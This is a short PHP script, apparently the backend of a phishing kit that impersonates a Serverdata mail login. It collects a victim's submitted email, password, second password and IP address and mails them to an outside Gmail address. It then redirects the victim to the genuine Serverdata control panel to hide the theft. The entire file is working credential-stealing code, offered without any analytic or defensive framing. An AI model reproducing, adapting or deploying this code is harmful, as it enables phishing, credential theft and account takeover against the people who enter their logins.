<?php
if(isset($_POST['email']) && ($_POST['pass'])){
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$emailadd234 = $_POST['email'];
$attpassword = $_POST['pass'];
$passw234 = $_POST['pass2'];
$to = 'lucasnick542@gmail.com';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";


$mail_server = 'Serverdata Server';
$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
      .'**************************************'."\n"
      .'email: '.$emailadd234."\n"
    .'Password: '.$attpassword."\n"
    .'2ndPassword: '.$passw234."\n"

.'UserIp: '.$ip."\n";



mail($to, $subject, $comment, $from);


header("Location: https://controlpanel.serverdata.net/");
exit;
}
else
{
    header("Location: https://google.com");
}


?>